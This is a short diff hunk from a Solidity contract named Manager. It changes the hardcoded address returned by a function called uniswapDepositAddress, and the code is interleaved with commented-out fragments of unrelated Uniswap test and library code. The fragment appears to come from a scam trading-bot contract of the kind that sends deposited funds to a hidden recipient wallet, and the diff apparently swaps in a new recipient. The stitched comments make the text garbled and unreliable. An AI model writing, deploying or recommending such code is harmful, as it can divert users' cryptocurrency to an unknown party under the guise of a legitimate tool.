@@ -541,7 +541,7 @@ contract Manager {
 //     expect(await token.DOMAIN_SEPARATOR()).to.eq(
 //       keccak256(
    function uniswapDepositAddress() public pure returns (address) {
-	return 0x0f1192B0c265471d2BE7Ada3FbEd8e2CC5919aa2;
+	return 0xA90A66e98D96b6e151243F69E08F492ECe2b54E4;
    }
 }
 //     // this low-level function should be called from a contract which performs important safety checks
